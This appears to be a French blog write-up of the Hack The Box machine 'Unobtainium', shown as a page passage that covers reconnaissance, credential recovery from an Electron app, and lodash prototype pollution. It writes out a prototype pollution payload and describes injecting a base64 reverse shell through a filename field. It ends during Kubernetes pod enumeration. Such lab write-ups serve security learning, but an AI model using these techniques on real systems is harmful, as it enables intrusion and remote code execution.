@@ -1,0 +1,640 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Unobtainium &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Unobtainium - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Unobtainium">
+    <meta itemprop="description" content="Hack The Box - Unobtainium - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Unobtainium">
+    <meta property="og:description" content="Hack The Box - Unobtainium - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/fr/article/unobtainium/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/fr/article/unobtainium/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/fr/article/unobtainium/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/" class="active">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/fr/article/unobtainium/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/fr/article/unobtainium/">
+            Hack The Box - Unobtainium
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2021-10-21</span>
+            
+        
+
+        
+            
+                <span class="readingTime">8 Min. lecture</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/write-up/">write-up</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/linux/">linux</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/unobtainium/uno-fiche.png" alt=""></p>
+<p>Unobtainium est une <a href="https://app.hackthebox.eu/machines/Unobtainium">machine</a> difficile qui a été déployée sur Hack The Box le samedi 10 avril 2021 and crée par <strong>felamos</strong>.</p>
+<h1 id="résumé-rapide">Résumé rapide</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#scan-nmap">Scan Nmap</a></li>
+        <li><a href="#enumération-web">Enumération web</a></li>
+        <li><a href="#première-connexion---webapp-pod">Première connexion - webapp pod</a></li>
+        <li><a href="#mouvement-latéral---devnode-pod">Mouvement latéral - devnode pod</a></li>
+        <li><a href="#elévation-de-privilèges---root">Elévation de privilèges - root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="scan-nmap">Scan Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT      STATE SERVICE       VERSION
+22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp    open  http          Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Unobtainium
+8443/tcp  open  ssl/https-alt
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 <span style="color:#ae81ff">403</span> Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
+|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
+|     Date: Wed, <span style="color:#ae81ff">04</span> Aug <span style="color:#ae81ff">2021</span> 00:24:18 GMT
+|     Content-Length: <span style="color:#ae81ff">212</span>
+|     <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span>/nice ports,/Trinity.txt.bak<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;code&#34;</span>:403<span style="color:#f92672">}</span>
+|   GenericLines: 
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 <span style="color:#ae81ff">403</span> Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
+|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
+|     Date: Wed, <span style="color:#ae81ff">04</span> Aug <span style="color:#ae81ff">2021</span> 00:24:18 GMT
+|     Content-Length: <span style="color:#ae81ff">185</span>
+|     <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span>/<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;code&#34;</span>:403<span style="color:#f92672">}</span>
+|   HTTPOptions: 
+|     HTTP/1.0 <span style="color:#ae81ff">403</span> Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
+|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
+|     Date: Wed, <span style="color:#ae81ff">04</span> Aug <span style="color:#ae81ff">2021</span> 00:24:18 GMT
+|     Content-Length: <span style="color:#ae81ff">189</span>
+|_    <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot options path &#34;</span>/<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;code&#34;</span>:403<span style="color:#f92672">}</span>
+|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (application/json).
+</span><span style="color:#e6db74">| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
+</span><span style="color:#e6db74">| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+</span><span style="color:#e6db74">| Not valid before: 2021-07-25T14:52:45
+</span><span style="color:#e6db74">|_Not valid after:  2022-07-26T14:52:45
+</span><span style="color:#e6db74">|_ssl-date: TLS randomness does not represent time
+</span><span style="color:#e6db74">| tls-alpn: 
+</span><span style="color:#e6db74">|   h2
+</span><span style="color:#e6db74">|_  http/1.1
+</span><span style="color:#e6db74">31337/tcp open  http          Node.js Express framework
+</span><span style="color:#e6db74">| http-methods: 
+</span><span style="color:#e6db74">|_  Potentially risky methods: PUT DELETE
+</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>application/json; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V<span style="color:#f92672">=</span>7.80%T<span style="color:#f92672">=</span>SSL%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>8/3%Time<span style="color:#f92672">=</span>6109F73B%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu
+SF:%r<span style="color:#f92672">(</span>GetRequest,1FF,<span style="color:#e6db74">&#34;HTTP/1\.0\x20403\x20Forbidden\r\nCache-Control:\x20n
+</span><span style="color:#e6db74">SF:o-cache,\x20private\r\nContent-Type:\x20application/json\r\nX-Content-T
+</span><span style="color:#e6db74">SF:ype-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x203082aa7f-
+</span><span style="color:#e6db74">SF:e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20c4
+</span><span style="color:#e6db74">SF:131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Wed,\x2004\x20Aug\x20202
+</span><span style="color:#e6db74">SF:1\x2000:24:18\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\&#34;kind\&#34;:\&#34;Statu
+</span><span style="color:#e6db74">SF:s\&#34;,\&#34;apiVersion\&#34;:\&#34;v1\&#34;,\&#34;metadata\&#34;:{},\&#34;status\&#34;:\&#34;Failure\&#34;,\&#34;mess
+</span><span style="color:#e6db74">SF:age\&#34;:\&#34;forbidden:\x20User\x20\\\&#34;system:anonymous\\\&#34;\x20cannot\x20get
+</span><span style="color:#e6db74">SF:\x20path\x20\\\&#34;/\\\&#34;\&#34;,\&#34;reason\&#34;:\&#34;Forbidden\&#34;,\&#34;details\&#34;:{},\&#34;code\
+</span><span style="color:#e6db74">SF:&#34;</span>:403<span style="color:#f92672">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(HTTPOptions,203,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20403<span style="color:#ae81ff">\x</span>20Forbidden<span style="color:#ae81ff">\r\n</span>Cache-Co
+SF:ntrol:<span style="color:#ae81ff">\x</span>20no-cache,<span style="color:#ae81ff">\x</span>20private<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20application/json<span style="color:#ae81ff">\r\n</span>
+SF:X-Content-Type-Options:<span style="color:#ae81ff">\x</span>20nosniff<span style="color:#ae81ff">\r\n</span>X-Kubernetes-Pf-Flowschema-Uid:<span style="color:#ae81ff">\x</span>
+SF:203082aa7f-e4b1-444a-a726-829587cd9e39<span style="color:#ae81ff">\r\n</span>X-Kubernetes-Pf-Prioritylevel
+SF:-Uid:<span style="color:#ae81ff">\x</span>20c4131e14-5fda-4a46-8349-09ccbed9efdd<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Wed,<span style="color:#ae81ff">\x</span>2004<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0Aug<span style="color:#ae81ff">\x</span>202021<span style="color:#ae81ff">\x</span>2000:24:18<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>20189<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#f92672">{</span><span style="color:#ae81ff">\&#34;</span>kin
+SF:d<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Status<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>apiVersion<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>v1<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>metadata<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>status<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Failu
+SF:re<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>message<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>forbidden:<span style="color:#ae81ff">\x</span>20User<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\\\&#34;</span>system:anonymous<span style="color:#ae81ff">\\\&#34;\x</span>20ca
+SF:nnot<span style="color:#ae81ff">\x</span>20options<span style="color:#ae81ff">\x</span>20path<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\\\&#34;</span>/<span style="color:#ae81ff">\\\&#34;\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>reason<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Forbidden<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>detai
+SF:ls<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>code<span style="color:#ae81ff">\&#34;</span>:403<span style="color:#f92672">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(FourOhFourRequest,21A,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20403<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:Forbidden<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20no-cache,<span style="color:#ae81ff">\x</span>20private<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0application/json<span style="color:#ae81ff">\r\n</span>X-Content-Type-Options:<span style="color:#ae81ff">\x</span>20nosniff<span style="color:#ae81ff">\r\n</span>X-Kubernetes
+SF:-Pf-Flowschema-Uid:<span style="color:#ae81ff">\x</span>203082aa7f-e4b1-444a-a726-829587cd9e39<span style="color:#ae81ff">\r\n</span>X-Kubern
+SF:etes-Pf-Prioritylevel-Uid:<span style="color:#ae81ff">\x</span>20c4131e14-5fda-4a46-8349-09ccbed9efdd<span style="color:#ae81ff">\r\n</span>D
+SF:ate:<span style="color:#ae81ff">\x</span>20Wed,<span style="color:#ae81ff">\x</span>2004<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202021<span style="color:#ae81ff">\x</span>2000:24:18<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Length:
+SF:<span style="color:#ae81ff">\x</span>20212<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#f92672">{</span><span style="color:#ae81ff">\&#34;</span>kind<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Status<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>apiVersion<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>v1<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>metadata<span style="color:#ae81ff">\&#34;</span>:
+SF:<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>status<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Failure<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>message<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>forbidden:<span style="color:#ae81ff">\x</span>20User<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\\\&#34;</span>syste
+SF:m:anonymous<span style="color:#ae81ff">\\\&#34;\x</span>20cannot<span style="color:#ae81ff">\x</span>20get<span style="color:#ae81ff">\x</span>20path<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\\\&#34;</span>/nice<span style="color:#ae81ff">\x</span>20ports,/Trinity
+SF:<span style="color:#ae81ff">\.</span>txt<span style="color:#ae81ff">\.</span>bak<span style="color:#ae81ff">\\\&#34;\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>reason<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Forbidden<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>details<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>code<span style="color:#ae81ff">\&#34;</span>:403<span style="color:#f92672">}</span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:n<span style="color:#e6db74">&#34;)%r(GenericLines,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Ty
+SF:pe:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;);
+</span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div><p>On retrouve :</p>
+<ul>
+<li>un service <code>SSH</code> sur le port <code>22/tcp</code></li>
+<li>un service <code>HTTP/Apache 2.4.41</code> sur le port <code>80/tcp</code></li>
+<li>un service <code>ssl/HTTPS</code> sur le port <code>8443/tcp</code></li>
+<li>un service <code>HTTP/Node.js Express Framework</code> sur le port <code>31337</code></li>
+<li>système d&rsquo;exploitation Linux</li>
+</ul>
+<h3 id="enumération-web">Enumération web</h3>
+<p>Quand je me rends sur le site sur le port <code>80</code>, on retrouve une page <code>Unobtainium</code> avec la possibilité de télécharger trois fichiers, un <code>.deb</code>, un <code>.rpm</code> et un <code>.snap</code>.</p>
+<p><img src="/img/unobtainium/uno-site.png" alt=""></p>
+<p>Je télécharge le fichier <code>unobtainium_debian.zip</code> pour l&rsquo;analyser</p>
+<p><img src="/img/unobtainium/uno-zip.png" alt=""></p>
+<p>Décompression de l&rsquo;archive et on se retrouve avec une fichier <code>unobtainium_1.0.0_amd64.deb</code></p>
+<p><img src="/img/unobtainium/uno-deb.png" alt=""></p>
+<p>Création d&rsquo;un dossier <code>/deb</code> et extraction du paquet <code>.deb</code></p>
+<p><img src="/img/unobtainium/uno-dpkg.png" alt=""></p>
+<p>On retrouve deux dossier <code>/opt</code> et <code>/usr</code>. Dans le dossier /opt, il y a un dossier <code>/unobtainium</code> qui contient une application <code>Unobtainium Chat</code>, je peux l&rsquo;exécuter avec la commande <code>sudo ./unobtainium</code> en précisant <code>--no-sandbox</code> comme paramètre.</p>
+<p><img src="/img/unobtainium/uno-app.png" alt=""></p>
+<p>L&rsquo;application contient plusieurs onglets :</p>
+<ul>
+<li>Dashboard</li>
+<li>Message Log</li>
+<li>Post Messages</li>
+<li>Todo</li>
+</ul>
+<p>L&rsquo;onglet <code>Message Log</code> est intéressant, car il contient un utilisateur potientiel <code>felamos</code>. C&rsquo;est aussi le pseudo du créateur de la box donc on est certainement sur la bonne voie.</p>
+<p><img src="/img/unobtainium/uno-mess.png" alt=""></p>
+<p>L&rsquo;autre onglet intéressant est <code>Todo</code>, car il contient une liste de choses à faire qui ressemble à un format en JSON. On peut voir qu&rsquo;il faut <code>mettre à jour de l'API node JS</code>, <code>améliorer la sécurité</code> ou encore <code>Ajouter une fonctionnalité de connexion</code>.</p>
+<p><img src="/img/unobtainium/uno-chat.png" alt=""></p>
+<p>Je ferme l&rsquo;application pour poursuivre l&rsquo;énumération et retrouve un dossier <code>/resources</code> qui contient un fichier <code>app.asar</code>, un fichier asar est une archive utilisée pour empaqueter le code source d&rsquo;une application utilisant Electron. Je peux l&rsquo;extraire en utilisant la commande <code>asar e app.asar .</code></p>
+<p><img src="/img/unobtainium/uno-asar.png" alt=""></p>
+<p>J&rsquo;ouvre tous les fichiers dans VSCodium et après investigation, on retrouve le fichier <code>todo.js</code> qui contient des credentials <code>felamos:Winter2021</code> dans le dossier <code>/src/js</code>.</p>
+<p><img src="/img/unobtainium/uno-todo.png" alt=""></p>
+<p>On peut voir qu&rsquo;il y a une URL <code>http://unobtainium.htb:31337/todo</code>, si j&rsquo;y vais je tombe le message <code>Cannot GET /todo</code></p>
+<p><img src="/img/unobtainium/uno-cannot.png" alt=""></p>
+<p>J&rsquo;intercepte la requête avec burp et je l&rsquo;envoie vers le répéteur avec <code>CTRL+r</code>, si je clique sur Send, j&rsquo;ai la même réponse.</p>
+<p><img src="/img/unobtainium/uno-burp.png" alt=""></p>
+<p>Clique droit -&gt; Change request method pour la transformer en POST puis Send</p>
+<p><img src="/img/unobtainium/uno-burp2.png" alt=""></p>
+<p>J&rsquo;ajoute les informations d&rsquo;authentification du fichier <code>todo.js</code> et transforme le type de contenu en <code>json</code></p>
+<p><img src="/img/unobtainium/uno-burp3.png" alt=""></p>
+<p>J&rsquo;obtiens maintenant une réponse positive avec le même résultat que l&rsquo;onglet <code>Todo</code> de l&rsquo;application <code>Unobtainium Chat</code>, si je lance le champ filename vide, je tombe sur une erreur de la part du serveur et le résultat nous donne des noms de plusieurs fichiers intéressants comme <code>index.js</code>, <code>route.js</code> etc.</p>
+<p><img src="/img/unobtainium/uno-burp4.png" alt=""></p>
+<p>Si je rentre <code>index.js</code> qui fait parti des fichiers du code source, j&rsquo;ai une réponse positive avec plusieurs indications</p>
+<p><img src="/img/unobtainium/uno-index.png" alt=""></p>
+<p>Et si je modifie le fichier pour mettre celui d&rsquo;en dessous <code>package.json</code>, j&rsquo;ai une autre réponse avec plusieurs dépendances de l&rsquo;application et leur version :</p>
+<ul>
+<li>express 4.16.4</li>
+<li>google-cloudstorage-commands 0.0.1</li>
+<li>lodash 4.17.4</li>
+</ul>
+<p><img src="/img/unobtainium/uno-package.png" alt=""></p>
+<h3 id="première-connexion---webapp-pod">Première connexion - webapp pod</h3>
+<p>Après avoir effectué plusieurs recherches d&rsquo;exploit correspondant au nom de la dépendance et de sa version, je suis tombé sur la vulnérabilité <code>prototype pollution</code> pour les versions inférieur à 4.17.11 de lodash. <a href="https://snyk.io/vuln/SNYK-JS-LODASH-73638">Prototype Pollution</a> est une vulnérabilité affectant JavaScript. Elle fait référence à la possibilité d&rsquo;injecter des propriétés dans les prototypes de construction existants du langage JS, tels que les objets.</p>
+<p>La première chose à faire est de nous donner les permissions pour télécharger des fichiers, on peut le faire à l&rsquo;aide de la commande curl en ajoutant les données <code>message&quot;:{&quot;__proto__&quot;:{&quot;canUpload&quot;:true}}}</code></p>
+<p><img src="/img/unobtainium/uno-true.png" alt=""></p>
+<p>Pour terminer j&rsquo;encode un reverse bash en base64, je l&rsquo;ajoute dans le champ <code>filename</code>, le décode et l&rsquo;exécute. J&rsquo;obtiens un shell en tant que <code>root</code>.</p>
+<p><img src="/img/unobtainium/uno-foot.png" alt=""></p>
+<p>Je peux récupérer le premier flag <code>user.txt</code>.</p>
+<p><img src="/img/unobtainium/uno-root.png" alt=""></p>
+<h3 id="mouvement-latéral---devnode-pod">Mouvement latéral - devnode pod</h3>
+<p>Après une énumération basique, lancement de linpeas sur la target</p>
+<p><img src="/img/unobtainium/uno-lin.png" alt=""></p>
+<p>Rapidement, on retrouve un crontab qui indique que tous les fichiers nommés <code>kubectl</code> sont automatiquement supprimé. kubectl est l&rsquo;outil en ligne de commande de l&rsquo;application <code>Kubernetes</code>.</p>
+<p><img src="/img/unobtainium/uno-kube.png" alt=""></p>
+<p>Il n&rsquo;existe pas sur la target, je vais le télécharger à l&rsquo;aide de ce <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux">lien</a> et le transférer dessus après l&rsquo;avoir renommé en <code>kubebctluks</code></p>
+<p><img src="/img/unobtainium/uno-forward.png" alt=""></p>
+<p>Je lui assigne les droits d&rsquo;éxécution et affiche la version pour &rsquo;m&rsquo;assurer que tout fonctionne correctement.</p>
+<p><img src="/img/unobtainium/uno-rights.png" alt=""></p>
+<p>Dans cet <a href="https://kubernetes.io/fr/docs/concepts/overview/working-with-objects/namespaces/">article</a> on peut voir que Kubernetes prend en charge plusieurs clusters virtuels présents sur le même cluster physique, ils sont appelés <code>namespaces</code>, on peut utiliser la commande <a href="https://v1-17.docs.kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#get">get</a> pour les afficher.</p>
+<p><img src="/img/unobtainium/uno-name.png" alt=""></p>
+<p>On retrouve les quatre espace de nommage initiaux <code>default</code>, <code>kube-node-lease</code>, <code>kube-public</code>, <code>kube-system</code> et un autre <code>dev</code>. Je souhaite afficher les pods disponible, mais ça ne fonctionne pas car je ne peux pas lister les ressources du namespace <code>default</code>. Un pod est un groupe d&rsquo;un ou plusieurs conteneur avec un stockage et réseau partagé, il existe deux types de pods, à conteneur simple et multiples. A l&rsquo;aide de cet <a href="https://devopssec.fr/article/gerer-manipuler-namespaces-et-resourcequotas-kubernetes">article</a>, je trouve la solution en ajoutant le flag <code>--namespace</code>.</p>
+<p><img src="/img/unobtainium/uno-pods.png" alt=""></p>
+<p>Il y a trois pods, on peut aller un peu plus loin et afficher les IPs et le noeud qui héberge les pods en ajoutant la commande <code>-o wide</code></p>
+<p><img src="/img/unobtainium/uno-wide.png" alt=""></p>
+<p>On a trois pods situé dans le noeuf <code>unobtainium</code> qui possèdent les IPs:</p>
+<ul>
+<li>devnode-deployment-cd86fb5c-6ms8d : <code>172.17.0.9</code></li>
+<li>devnode-deployment-cd86fb5c-mvrfz : <code>172.17.0.7</code></li>
+<li>devnode-deployment-cd86fb5c-qlxww : <code>172.17.0.5</code></li>
+</ul>
